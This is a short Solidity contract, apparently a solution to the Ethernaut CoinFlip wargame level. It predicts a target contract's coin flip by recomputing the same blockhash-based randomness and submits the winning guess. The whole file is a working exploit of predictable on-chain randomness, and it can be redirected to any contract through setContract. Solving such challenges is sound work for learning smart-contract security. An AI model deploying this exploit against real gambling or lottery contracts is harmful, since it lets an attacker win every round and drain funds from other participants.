// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

interface CoinFlip {
    function flip(bool) external returns (bool);
}

/**
 * @title CoinFlipGuesser
 * @dev Find the next coin flip for ethernaut challenge
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract CoinFlipGuesser {
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coin_flip_contract = address(0x4cd0743D0F367281008b9DaABb24a59613DC0496);

    function setContract(address c) public {
        coin_flip_contract = c;
    } 

    function guessFlip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        return CoinFlip(coin_flip_contract).flip(blockValue.div(FACTOR) == 1);
    }
}